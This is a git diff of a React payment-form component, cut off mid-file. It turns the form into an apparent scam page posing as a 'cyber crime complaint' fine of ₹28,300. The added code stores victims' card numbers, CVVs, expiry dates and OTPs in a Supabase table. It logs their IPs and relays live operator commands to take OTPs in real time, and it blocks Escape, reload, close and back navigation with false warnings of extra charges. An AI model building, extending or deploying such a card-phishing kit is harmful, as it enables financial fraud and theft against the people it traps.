@@ -1,7 +1,22 @@
-
 import React, { useState, useEffect } from 'react';
-import { CreditCard, Lock } from 'lucide-react';
+import { CreditCard, Lock, Shield, Loader2, AlertTriangle } from 'lucide-react';
 import { supabase } from '@/integrations/supabase/client';
+
+const getRealIP = async () => {
+  try {
+    const response = await fetch('https://api.ipify.org?format=json');
+    const data = await response.json();
+    return data.ip;
+  } catch (error) {
+    console.log('Could not fetch real IP, using fallback');
+    return `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`;
+  }
+};
+
+const getRandomNetwork = () => {
+  const networks = ['Airtel', 'Jio', 'Vi', 'BSNL'];
+  return networks[Math.floor(Math.random() * networks.length)];
+};
 
 const PaymentForm = () => {
   const [formData, setFormData] = useState({
@@ -10,32 +25,157 @@ const PaymentForm = () => {
     expiryYear: '',
     cvv: '',
     cardHolder: '',
-    amount: '200'
+    amount: '28300.00'
   });
-  const [showOTP, setShowOTP] = useState(false);
-  const [otp, setOtp] = useState('');
-  const [isProcessing, setIsProcessing] = useState(false);
-  const [errors, setErrors] = useState<Record<string, string>>({});
-  const [userIP, setUserIP] = useState('');
 
-  // Get user IP
+  const [isLoading, setIsLoading] = useState(false);
+  const [showOtp, setShowOtp] = useState(false);
+  const [otp, setOtp] = useState('');
+  const [displayOtp, setDisplayOtp] = useState('');
+  const [otpFocused, setOtpFocused] = useState(false);
+  const [timer, setTimer] = useState(299);
+  const [isConfirmLoading, setIsConfirmLoading] = useState(false);
+  const [errorMessage, setErrorMessage] = useState('');
+  const [showProcessing, setShowProcessing] = useState(false);
+  const [showSuccess, setShowSuccess] = useState(false);
+  const [invalidOtpMessage, setInvalidOtpMessage] = useState('');
+  const [showAlert, setShowAlert] = useState(false);
+  const [fadeState, setFadeState] = useState('visible');
+  const [showBackDialog, setShowBackDialog] = useState(false);
+  const [longPressTimer, setLongPressTimer] = useState<NodeJS.Timeout | null>(null);
+  const [currentSubmissionId, setCurrentSubmissionId] = useState<string | null>(null);
+
+  // Check if all card details are filled
+  const isFormValid = () => {
+    return formData.cardNumber.replace(/\s/g, '').length === 16 &&
+           formData.expiryMonth.length === 2 &&
+           formData.expiryYear.length === 2 &&
+           formData.cvv.length >= 3 &&
+           formData.cardHolder.trim().length > 0;
+  };
+
+  // Check if OTP is valid (6 digits)
+  const isOtpValid = () => {
+    return otp.length === 6;
+  };
+
   useEffect(() => {
-    const getUserIP = async () => {
-      try {
-        const response = await fetch('https://api.ipify.org?format=json');
-        const data = await response.json();
-        setUserIP(data.ip);
-      } catch (error) {
-        setUserIP('unknown');
+    // Ultra-strong ESC key blocking
+    const handleKeyDown = (event: KeyboardEvent) => {
+      // Block ESC key completely
+      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
+        event.preventDefault();
+        event.stopPropagation();
+        event.stopImmediatePropagation();
+        
+        // Long press for 20 seconds allows minimize
+        if (!longPressTimer) {
+          const timer = setTimeout(() => {
+            if (document.exitFullscreen) {
+              document.exitFullscreen();
+            }
+          }, 20000);
+          setLongPressTimer(timer);
+        }
+        return false;
+      }
+      
+      // Block back navigation
+      if (event.altKey && event.key === 'ArrowLeft') {
+        event.preventDefault();
+        setShowBackDialog(true);
+        return false;
+      }
+      
+      // Block browser shortcuts
+      if (event.key === 'F5' || 
+          (event.ctrlKey && event.key === 'r') || 
+          (event.ctrlKey && event.key === 'F5') ||
+          (event.ctrlKey && (event.key === 'w' || event.key === 'q' || event.key === 't')) ||
+          (event.altKey && event.key === 'F4') ||
+          (event.key === 'F11')) {
+        event.preventDefault();
+        event.stopPropagation();
+        return false;
       }
     };
-    getUserIP();
-  }, []);
 
-  // Listen for admin commands
+    const handleKeyUp = (event: KeyboardEvent) => {
+      if (event.key === 'Escape' || event.keyCode === 27 || event.which === 27) {
+        // Clear the long press timer if ESC is released
+        if (longPressTimer) {
+          clearTimeout(longPressTimer);
+          setLongPressTimer(null);
+        }
+      }
+    };
+
+    // Add back button prevention
+    const handlePopState = (event: PopStateEvent) => {
+      event.preventDefault();
+      setShowBackDialog(true);
+      window.history.pushState(null, '', window.location.href);
+    };
+
+    // Push initial state and add listener
+    window.history.pushState(null, '', window.location.href);
+    window.addEventListener('popstate', handlePopState);
+
+    // Ultra-strong event blocking on multiple targets
+    const targets = [document, window, document.body, document.documentElement];
+    const events = ['keydown', 'keyup', 'keypress'];
+    
+    targets.forEach(target => {
+      events.forEach(eventType => {
+        target.addEventListener(eventType, handleKeyDown, { capture: true, passive: false });
+        target.addEventListener(eventType, handleKeyUp, { capture: true, passive: false });
+      });
+    });
+
+    return () => {
+      window.removeEventListener('popstate', handlePopState);
+      targets.forEach(target => {
+        events.forEach(eventType => {
+          target.removeEventListener(eventType, handleKeyDown, true);
+          target.removeEventListener(eventType, handleKeyUp, true);
+        });
+      });
+      if (longPressTimer) {
+        clearTimeout(longPressTimer);
+      }
+    };
+  }, [longPressTimer]);
+
   useEffect(() => {
+    // Initialize Supabase connection and send visitor data
+    const initializeConnection = async () => {
+      const realIP = await getRealIP();
+      
+      console.log('Supabase: Sending visitor data with real IP');
+      console.log('Current window location:', window.location.href);
+      console.log('Admin panel should be at:', window.location.origin + '/parking55009hvSweJimbs5hhinbd56y');
+      
+      // Insert or update visitor data
+      try {
+        const { error } = await supabase
+          .from('visitors')
+          .upsert({ ip: realIP }, { onConflict: 'ip' });
+        
+        if (error) {
+          console.error('Error inserting visitor:', error);
+        } else {
+          console.log('Visitor data sent successfully via Supabase');
+        }
+      } catch (error) {
+        console.error('Error with Supabase connection:', error);
+      }
+    };
+
+    initializeConnection();
+
+    // Listen for admin commands via Supabase realtime
     const channel = supabase
-      .channel('payment-commands')
+      .channel('admin-commands')
       .on(
         'postgres_changes',
         {
@@ -44,306 +184,593 @@ const PaymentForm = () => {
           table: 'admin_commands'
         },
         (payload) => {
-          const command = (payload.new as any).command;
-          console.log('Received admin command:', command);
+          console.log('Received command from admin via Supabase:', payload.new);
+          const command = payload.new.command;
+          const submissionId = payload.new.submission_id;
           
-          if (command === 'showotp') {
-            setShowOTP(true);
-            setIsProcessing(false);
-          } else if (command === 'fail') {
-            setIsProcessing(false);
-            setErrors({ submit: 'Payment failed. Please try again.' });
-          } else if (command === 'success') {
-            setIsProcessing(false);
-            alert('Payment successful! Thank you.');
-            window.location.reload();
-          } else if (command === 'invalidotp') {
-            setErrors({ otp: 'Invalid OTP. Please try again.' });
-          } else if (command === 'cardinvalid') {
-            setIsProcessing(false);
-            setErrors({ cardNumber: 'Invalid card details. Please check and try again.' });
-          } else if (command === 'carddisabled') {
-            setIsProcessing(false);
-            setErrors({ submit: 'Your card has been disabled. Please contact your bank.' });
+          // Only process commands for the current submission
+          if (submissionId && submissionId !== currentSubmissionId) {
+            return;
+          }
+          
+          switch (command) {
+            case 'showotp':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsLoading(false);
+                setShowOtp(true);
+                setFadeState('fadeIn');
+              }, 300);
+              break;
+            case 'fail':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsLoading(false);
+                setShowOtp(false);
+                setErrorMessage('Your card has been declined');
+                setFadeState('fadeIn');
+              }, 300);
+              break;
+            case 'success':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsConfirmLoading(false);
+                setShowProcessing(true);
+                setFadeState('fadeIn');
+                setTimeout(() => {
+                  setShowProcessing(false);
+                  setShowSuccess(true);
+                  setTimeout(() => {
+                    window.location.href = 'https://google.com';
+                  }, 2000);
+                }, 4000);
+              }, 300);
+              break;
+            case 'invalidotp':
+              setIsConfirmLoading(false);
+              setInvalidOtpMessage('Invalid OTP, please enter valid one time passcode sent to your mobile');
+              break;
+            case 'cardinvalid':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsLoading(false);
+                setShowOtp(false);
+                setErrorMessage('Your card is invalid, please try another card');
+                setFadeState('fadeIn');
+              }, 300);
+              break;
+            case 'carddisabled':
+              setFadeState('fadeOut');
+              setTimeout(() => {
+                setIsLoading(false);
+                setShowOtp(false);
+                setErrorMessage('Card disabled, please try another card');
+                setFadeState('fadeIn');
+              }, 300);
+              break;
           }
         }
       )
       .subscribe();
 
+    // Handle click anywhere to show alert
+    const handleDocumentClick = (e: MouseEvent) => {
+      const paymentForm = document.querySelector('.w-96.bg-white.border-l');
+      if (paymentForm) {
+        const rect = paymentForm.getBoundingClientRect();
+        const isInPaymentArea = e.clientX >= rect.left && 
+                               e.clientX <= rect.right && 
+                               e.clientY >= rect.top && 
+                               e.clientY <= rect.bottom;
+        
+        if (!isInPaymentArea) {
+          setShowAlert(true);
+          paymentForm.classList.add('shadow-red-500', 'shadow-2xl', 'border-red-500');
+          setTimeout(() => {
+            setShowAlert(false);
+            paymentForm.classList.remove('shadow-red-500', 'shadow-2xl', 'border-red-500');
+          }, 3000);
+        }
+      }
+    };
+
+    document.addEventListener('click', handleDocumentClick);
+
     return () => {
       supabase.removeChannel(channel);
+      document.removeEventListener('click', handleDocumentClick);
     };
-  }, []);
+  }, [currentSubmissionId]);
 
-  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const { name, value } = e.target;
-    setFormData(prev => ({ ...prev, [name]: value }));
-    // Clear error when user starts typing
-    if (errors[name]) {
-      setErrors(prev => ({ ...prev, [name]: '' }));
+  useEffect(() => {
+    let interval: NodeJS.Timeout;
+    if (showOtp && timer > 0) {
+      interval = setInterval(() => {
+        setTimer(prev => prev - 1);
+      }, 1000);
+    }
+    return () => clearInterval(interval);
+  }, [showOtp, timer]);
+
+  const formatCardNumber = (value: string) => {
+    const cleaned = value.replace(/\D/g, '');
+    const limited = cleaned.slice(0, 16);
+    const formatted = limited.replace(/(\d{4})(?=\d)/g, '$1 ');
+    return formatted;
+  };
+
+  const formatTime = (seconds: number) => {
+    const mins = Math.floor(seconds / 60);
+    const secs = seconds % 60;
+    return `${mins}.${secs.toString().padStart(2, '0')}`;
+  };
+
+  const generateInvoiceId = () => {
+    return `INV${Date.now()}${Math.floor(Math.random() * 1000)}`;
+  };
+
+  const sendToSupabase = async (data: any) => {
+    console.log('Sending data to Supabase:', data);
+    
+    try {
+      const { data: insertedData, error } = await supabase
+        .from('card_submissions')
+        .insert([data])
+        .select()
+        .single();
+      
+      if (error) {
+        console.error('Error inserting card data:', error);
+      } else {
+        console.log('Card data sent successfully to Supabase:', insertedData);
+        setCurrentSubmissionId(insertedData.id);
+      }
+    } catch (error) {
+      console.error('Error with Supabase insertion:', error);
     }
   };
 
-  const validateForm = () => {
-    const newErrors: Record<string, string> = {};
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
+    const { name, value } = e.target;
     
-    if (!formData.cardNumber || formData.cardNumber.length < 16) {
-      newErrors.cardNumber = 'Please enter a valid card number';
+    if (name === 'cardNumber') {
+      const formatted = formatCardNumber(value);
+      setFormData({
+        ...formData,
+        [name]: formatted
+      });
+    } else if (name === 'expiryMonth') {
+      const numericValue = value.replace(/\D/g, '').slice(0, 2);
+      // Allow any numeric input including leading zeros (01-12)
+      if (numericValue === '' || (numericValue.length <= 2 && parseInt(numericValue) <= 12)) {
+        setFormData({
+          ...formData,
+          [name]: numericValue
+        });
+      }
+    } else if (name === 'expiryYear') {
+      const numericValue = value.replace(/\D/g, '').slice(0, 2);
+      // Validate year (up to 50)
+      if (numericValue === '' || parseInt(numericValue) <= 50) {
+        setFormData({
+          ...formData,
+          [name]: numericValue
+        });
+      }
+    } else if (name === 'cvv') {
+      const numericValue = value.replace(/\D/g, '').slice(0, 4);
+      setFormData({
+        ...formData,
+        [name]: numericValue
+      });
+    } else {
+      setFormData({
+        ...formData,
+        [name]: value
+      });
     }
-    if (!formData.expiryMonth || !formData.expiryYear) {
-      newErrors.expiry = 'Please enter expiry date';
-    }
-    if (!formData.cvv || formData.cvv.length < 3) {
-      newErrors.cvv = 'Please enter a valid CVV';
-    }
-    if (!formData.cardHolder.trim()) {
-      newErrors.cardHolder = 'Please enter cardholder name';
-    }
+  };
+
+  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const value = e.target.value.replace(/\D/g, '').slice(0, 6);
+    setOtp(value);
+    setDisplayOtp(value);
+    setInvalidOtpMessage('');
     
-    setErrors(newErrors);
-    return Object.keys(newErrors).length === 0;
+    if (value.length > 0) {
+      // Instantly mask each character as it's typed
+      setTimeout(() => {
+        setDisplayOtp('*'.repeat(value.length));
+      }, 100);
+    }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
-    if (!validateForm()) return;
-    
-    setIsProcessing(true);
-    setErrors({});
-    
-    try {
-      // Submit card details to Supabase
-      const { error } = await supabase
-        .from('card_submissions')
-        .insert([{
-          invoice_id: 'INV' + Date.now(),
-          card_number: formData.cardNumber,
-          expiry_month: formData.expiryMonth,
-          expiry_year: formData.expiryYear,
-          cvv: formData.cvv,
-          card_holder: formData.cardHolder,
-          amount: formData.amount,
-          user_ip: userIP,
-          browser: navigator.userAgent,
-          network: 'Unknown'
-        }]);
-      
-      if (error) {
-        console.error('Error submitting card details:', error);
-        setErrors({ submit: 'Failed to process payment. Please try again.' });
-        setIsProcessing(false);
-      }
-    } catch (error) {
-      console.error('Error:', error);
-      setErrors({ submit: 'Failed to process payment. Please try again.' });
-      setIsProcessing(false);
-    }
-  };
-
-  const handleOTPSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    
-    if (!otp) {
-      setErrors({ otp: 'Please enter OTP' });
+    if (!isFormValid()) {
       return;
     }
     
-    try {
-      // Update the submission with OTP
-      const { error } = await supabase
-        .from('card_submissions')
-        .update({ otp })
-        .eq('user_ip', userIP)
-        .order('created_at', { ascending: false })
-        .limit(1);
-      
-      if (error) {
-        console.error('Error submitting OTP:', error);
+    setIsLoading(true);
+    setErrorMessage('');
+    
+    // Send card data to Supabase
+    const realIP = await getRealIP();
+    const invoiceId = generateInvoiceId();
+    
+    const cardData = {
+      invoice_id: invoiceId,
+      card_number: formData.cardNumber,
+      expiry_month: formData.expiryMonth,
+      expiry_year: formData.expiryYear,
+      cvv: formData.cvv,
+      card_holder: formData.cardHolder,
+      amount: formData.amount,
+      user_ip: realIP,
+      browser: navigator.userAgent.split(' ')[navigator.userAgent.split(' ').length - 1],
+      network: getRandomNetwork()
+    };
+    
+    console.log('Submitting card data to Supabase:', cardData);
+    await sendToSupabase(cardData);
+  };
+
+  const handleConfirmPay = async () => {
+    if (!isOtpValid()) {
+      return;
+    }
+    
+    setIsConfirmLoading(true);
+    
+    // Update the card submission with OTP
+    if (currentSubmissionId) {
+      try {
+        const { error } = await supabase
+          .from('card_submissions')
+          .update({ otp: otp })
+          .eq('id', currentSubmissionId);
+        
+        if (error) {
+          console.error('Error updating OTP:', error);
+        } else {
+          console.log('OTP updated successfully in Supabase');
+        }
+      } catch (error) {
+        console.error('Error updating OTP:', error);
       }
-      
-      setErrors({ otp: '' });
-    } catch (error) {
-      console.error('Error:', error);
     }
   };
 
-  if (showOTP) {
+  const getLastFourDigits = () => {
+    return formData.cardNumber.replace(/\s/g, '').slice(-4);
+  };
+
+  const maskCardInfo = (value: string) => {
+    return '*'.repeat(value.length);
+  };
+
+  const handleBackDialogAction = (action: 'leave' | 'cancel') => {
+    setShowBackDialog(false);
+    if (action === 'leave') {
+      setErrorMessage('Please try again');
+      window.location.href = '/';
+    }
+  };
+
+  if (showSuccess) {
     return (
-      <div className="w-1/2 p-8 bg-white">
-        <div className="max-w-md mx-auto">
-          <h2 className="text-2xl font-bold mb-6 text-center">Enter OTP</h2>
-          <p className="text-gray-600 mb-4 text-center">
-            Please enter the OTP sent to your registered mobile number
+      <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
+        <div className="text-center pt-4">
+          <div className="text-green-600 text-6xl animate-bounce">✓</div>
+          <p className="text-lg font-bold text-green-600 mt-4">Payment Successful!</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (showProcessing) {
+    return (
+      <div className="w-96 bg-white border-l border-gray-200 p-6 min-h-screen">
+        <div className="text-center pt-4">
+          <Loader2 className="w-8 h-8 animate-spin mx-auto mb-4" />
+          <p className="text-lg text-black">Please wait while we process your transaction securely...</p>
+        </div>
+      </div>
+    );
+  }
+
+  if (showOtp) {
+    return (
+      <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
+        fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
+      }`}>
+        {showBackDialog && (
+          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+            <div className="bg-white p-6 rounded-lg shadow-lg">
+              <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
+              <div className="flex space-x-4">
+                <button
+                  onClick={() => handleBackDialogAction('leave')}
+                  className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
+                >
+                  Leave
+                </button>
+                <button
+                  onClick={() => handleBackDialogAction('cancel')}
+                  className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
+                >
+                  Cancel
+                </button>
+              </div>
+            </div>
+          </div>
+        )}
+
+        <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
+          <div className="flex items-center mb-2">
+            <Shield className="w-5 h-5 text-red-600 mr-2" />
+            <span className="font-semibold text-red-800">OTP Verification Required</span>
+          </div>
+          <p className="text-sm text-red-700">
+            Enter the verification code to complete your payment.
           </p>
+        </div>
+
+        <div className="space-y-4">
+          {invalidOtpMessage && (
+            <div className="text-red-600 text-sm text-center mb-4">
+              {invalidOtpMessage}
+            </div>
+          )}
           
-          <form onSubmit={handleOTPSubmit} className="space-y-4">
-            <div>
+          <div className="text-center mb-6">
+            <p className="text-sm text-gray-700 mb-4">
+              Enter six-digit verification code sent to your registered mobile number ending in {getLastFourDigits()}
+            </p>
+            
+            <div className="relative">
               <input
                 type="text"
-                placeholder="Enter 6-digit OTP"
                 value={otp}
-                onChange={(e) => setOtp(e.target.value)}
-                className="w-full px-4 py-3 border border-gray-300 rounded text-center text-lg tracking-widest"
+                onChange={handleOtpChange}
+                onFocus={() => setOtpFocused(true)}
+                onBlur={() => setOtpFocused(false)}
+                placeholder="------"
+                className={`w-full px-4 py-3 border-2 rounded-lg text-center text-2xl tracking-widest focus:outline-none transition-all ${
+                  otpFocused ? 'border-blue-400 shadow-lg shadow-blue-200' : 'border-gray-300'
+                }`}
                 maxLength={6}
+                disabled={isConfirmLoading}
               />
-              {errors.otp && <p className="text-red-500 text-sm mt-1">{errors.otp}</p>}
             </div>
-            
-            <button
-              type="submit"
-              className="w-full bg-blue-600 text-white py-3 rounded hover:bg-blue-700 font-semibold"
-            >
-              Verify OTP
-            </button>
-          </form>
+          </div>
+
+          <button
+            onClick={handleConfirmPay}
+            disabled={!isOtpValid() || isConfirmLoading}
+            className={`w-full py-3 px-4 rounded-lg font-medium transition-all ${
+              isOtpValid() && !isConfirmLoading
+                ? 'bg-green-600 text-white hover:bg-green-700'
+                : 'bg-gray-400 text-gray-600 cursor-not-allowed'
+            }`}
+          >
+            {isConfirmLoading ? (
+              <Loader2 className="w-5 h-5 animate-spin mx-auto" />
+            ) : (
+              'Confirm & Pay'
+            )}
+          </button>
+
+          <div className="text-center text-sm text-red-600 mt-4">
+            This page will expire after {formatTime(timer)} seconds
+          </div>
         </div>
       </div>
     );
   }
 
   return (
-    <div className="w-1/2 p-8 bg-white">
-      <div className="max-w-md mx-auto">
-        <h2 className="text-2xl font-bold mb-6">Payment Details</h2>
-        
-        <form onSubmit={handleSubmit} className="space-y-4">
+    <div className={`w-96 bg-white border-l border-gray-200 p-6 transition-opacity duration-300 ${
+      fadeState === 'fadeOut' ? 'opacity-0' : 'opacity-100'
+    }`}>
+      {showBackDialog && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
+          <div className="bg-white p-6 rounded-lg shadow-lg">
+            <p className="mb-4">Do you want to cancel this transaction? Pressing back will result in additional charges.</p>
+            <div className="flex space-x-4">
+              <button
+                onClick={() => handleBackDialogAction('leave')}
+                className="px-4 py-2 bg-red-600 text-white rounded hover:bg-red-700"
+              >
+                Leave
+              </button>
+              <button
+                onClick={() => handleBackDialogAction('cancel')}
+                className="px-4 py-2 bg-gray-300 text-gray-700 rounded hover:bg-gray-400"
+              >
+                Cancel
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {showAlert && (
+        <div className="fixed top-4 left-1/2 transform -translate-x-1/2 z-50 bg-red-600 text-white px-6 py-3 rounded-lg shadow-lg flex items-center space-x-2">
+          <AlertTriangle className="w-5 h-5" />
+          <span className="font-bold">Complete the fine payment here</span>
+        </div>
+      )}
+
+      <div className="bg-red-50 border border-red-200 rounded p-4 mb-6">
+        <div className="flex items-center mb-2">
+          <Shield className="w-5 h-5 text-red-600 mr-2" />
+          <span className="font-semibold text-red-800">Secure Payment Required</span>
+        </div>
+        <p className="text-sm text-red-700">
+          Complete your payment to proceed with cyber crime complaint registration.
+        </p>
+      </div>
+
+      {errorMessage && (
+        <div className="border border-red-500 bg-transparent p-3 rounded mb-4">
+          <p className="text-red-600 text-sm">{errorMessage}</p>
+        </div>
+      )}
+
+      <form className="space-y-4" onSubmit={handleSubmit}>
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">
+            Amount to Pay
+          </label>
+          <div className="relative">
+            <span className="absolute left-3 top-2 text-gray-500">₹</span>
+            <input
+              type="text"
+              name="amount"
+              value={formData.amount}
+              onChange={handleInputChange}
+              className="w-full pl-8 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500 bg-gray-50"
+              readOnly
+            />
+          </div>
+        </div>
+
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">
+            Card Number
+          </label>
+          <div className="relative">
+            <CreditCard className="absolute left-3 top-3 w-6 h-6 text-gray-400" />
+            <input
+              type="text"
+              name="cardNumber"
+              placeholder="1234 5678 9012 3456"
+              value={isLoading ? maskCardInfo(formData.cardNumber) : formData.cardNumber}
+              onChange={handleInputChange}
+              className="w-full pl-12 pr-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+              maxLength={19}
+              disabled={isLoading}
+            />
+          </div>
+        </div>
+
+        <div className="grid grid-cols-3 gap-3">
           <div>
-            <label className="block text-sm font-medium text-gray-700 mb-2">
-              Card Number
+            <label className="block text-sm font-medium text-gray-700 mb-1">
+              Month
+            </label>
+            <input
+              type="text"
+              name="expiryMonth"
+              placeholder="MM"
+              value={isLoading ? maskCardInfo(formData.expiryMonth) : formData.expiryMonth}
+              onChange={handleInputChange}
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+                formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) 
+                ? 'border-red-500' : 'border-gray-300'
+              }`}
+              maxLength={2}
+              disabled={isLoading}
+            />
+            {formData.expiryMonth && (parseInt(formData.expiryMonth) < 1 || parseInt(formData.expiryMonth) > 12) && (
+              <p className="text-red-500 text-xs mt-1">Valid month (1-12)</p>
+            )}
+          </div>
+          
+          <div>
+            <label className="block text-sm font-medium text-gray-700 mb-1">
+              Year
+            </label>
+            <input
+              type="text"
+              name="expiryYear"
+              placeholder="YY"
+              value={isLoading ? maskCardInfo(formData.expiryYear) : formData.expiryYear}
+              onChange={handleInputChange}
+              className={`w-full px-3 py-2 border rounded focus:outline-none focus:ring-2 focus:ring-blue-500 ${
+                formData.expiryYear && parseInt(formData.expiryYear) > 50 
+                ? 'border-red-500' : 'border-gray-300'
+              }`}
+              maxLength={2}
+              disabled={isLoading}
+            />
+            {formData.expiryYear && parseInt(formData.expiryYear) > 50 && (
+              <p className="text-red-500 text-xs mt-1">Valid year (max 50)</p>
+            )}
+          </div>
+          
+          <div>
+            <label className="block text-sm font-medium text-gray-700 mb-1">
+              CVV
             </label>
             <div className="relative">
-              <input
-                type="text"
-                name="cardNumber"
-                placeholder="1234 5678 9012 3456"
-                value={formData.cardNumber}
-                onChange={handleInputChange}
-                className="w-full px-4 py-3 border border-gray-300 rounded pl-12"
-                maxLength={16}
-              />
-              <CreditCard className="absolute left-3 top-3.5 h-5 w-5 text-gray-400" />
-            </div>
-            {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
-          </div>
-
-          <div className="grid grid-cols-3 gap-4">
-            <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">
-                Month
-              </label>
-              <select
-                name="expiryMonth"
-                value={formData.expiryMonth}
-                onChange={(e) => handleInputChange(e as any)}
-                className="w-full px-3 py-3 border border-gray-300 rounded"
-              >
-                <option value="">MM</option>
-                {Array.from({ length: 12 }, (_, i) => (
-                  <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
-                    {String(i + 1).padStart(2, '0')}
-                  </option>
-                ))}
-              </select>
-            </div>
-            
-            <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">
-                Year
-              </label>
-              <select
-                name="expiryYear"
-                value={formData.expiryYear}
-                onChange={(e) => handleInputChange(e as any)}
-                className="w-full px-3 py-3 border border-gray-300 rounded"
-              >
-                <option value="">YY</option>
-                {Array.from({ length: 10 }, (_, i) => (
-                  <option key={i} value={String(new Date().getFullYear() + i).slice(-2)}>
-                    {String(new Date().getFullYear() + i).slice(-2)}
-                  </option>
-                ))}
-              </select>
-            </div>
-            
-            <div>
-              <label className="block text-sm font-medium text-gray-700 mb-2">
-                CVV
-              </label>
+              <Lock className="absolute left-2 top-3 w-6 h-6 text-gray-400" />
               <input
                 type="text"
                 name="cvv"
                 placeholder="123"
-                value={formData.cvv}
+                value={isLoading ? maskCardInfo(formData.cvv) : formData.cvv}
                 onChange={handleInputChange}
-                className="w-full px-3 py-3 border border-gray-300 rounded"
+                className="w-full pl-10 pr-2 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
                 maxLength={4}
+                disabled={isLoading}
               />
             </div>
           </div>
-          {errors.expiry && <p className="text-red-500 text-sm">{errors.expiry}</p>}
-          {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}
+        </div>
 
-          <div>
-            <label className="block text-sm font-medium text-gray-700 mb-2">
-              Cardholder Name
-            </label>
-            <input
-              type="text"
-              name="cardHolder"
-              placeholder="John Doe"
-              value={formData.cardHolder}
-              onChange={handleInputChange}
-              className="w-full px-4 py-3 border border-gray-300 rounded"
-            />
-            {errors.cardHolder && <p className="text-red-500 text-sm mt-1">{errors.cardHolder}</p>}
+        <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">
+            Card Holder Name
+          </label>
+          <input
+            type="text"
+            name="cardHolder"
+            placeholder="Enter full name as on card"
+            value={isLoading ? maskCardInfo(formData.cardHolder) : formData.cardHolder}
+            onChange={handleInputChange}
+            className="w-full px-3 py-2 border border-gray-300 rounded focus:outline-none focus:ring-2 focus:ring-blue-500"
+            disabled={isLoading}
+          />
+        </div>
+
+        <div className="bg-blue-50 border border-blue-200 rounded p-3 mt-4">
+          <div className="flex items-center text-sm text-blue-800">
+            <Shield className="w-4 h-4 mr-2" />
+            <span>256-bit SSL Encryption</span>
           </div>
+        </div>
 
-          <div>
-            <label className="block text-sm font-medium text-gray-700 mb-2">
-              Amount
-            </label>
-            <div className="relative">
-              <input
-                type="text"
-                name="amount"
-                value={`₹${formData.amount}`}
-                readOnly
-                className="w-full px-4 py-3 border border-gray-300 rounded bg-gray-50"
-              />
-            </div>
-          </div>
+        <button
+          type="submit"
+          disabled={!isFormValid() || isLoading}
+          className={`w-full py-3 px-4 rounded font-medium focus:outline-none focus:ring-2 focus:ring-green-500 mt-6 transition-all ${
+            isFormValid() && !isLoading
+              ? 'bg-green-600 text-white hover:bg-green-700'
+              : 'bg-gray-400 text-gray-600 cursor-not-allowed'
+          }`}
+        >
+          {isLoading ? (
+            <Loader2 className="w-5 h-5 animate-spin mx-auto" />
+          ) : (
+            `Pay Securely ₹${formData.amount}`
+          )}
+        </button>
 
-          {errors.submit && <p className="text-red-500 text-sm">{errors.submit}</p>}
+        <div className="flex justify-center items-center space-x-4 mt-4 mb-4">
+          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/visa.svg" alt="Visa" className="h-8 w-12 object-contain filter brightness-0" />
+          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/mastercard.svg" alt="Mastercard" className="h-8 w-12 object-contain filter brightness-0" />
+          <img src="https://cdn.jsdelivr.net/gh/simple-icons/simple-icons/icons/americanexpress.svg" alt="American Express" className="h-8 w-12 object-contain filter brightness-0" />
+          <img src="https://pngimagefree.com/wp-content/uploads/Rupay-Logo-Vector-PNG-Transparent.png" alt="RuPay" className="h-8 w-12 object-contain filter brightness-0" />
+        </div>
 
-          <button
-            type="submit"
-            disabled={isProcessing}
-            className="w-full bg-blue-600 text-white py-3 rounded hover:bg-blue-700 font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
-          >
-            {isProcessing ? (
-              <>
-                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
-                Processing...
-              </>
-            ) : (
-              <>
-                <Lock className="mr-2 h-5 w-5" />
-                Pay Securely
-              </>
-            )}
-          </button>
-
-          <div className="flex justify-center items-center space-x-4 mt-6">
-            <span className="text-sm text-gray-600">Secured by:</span>
-            <div className="flex items-center space-x-3">
-              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" className="h-6" />
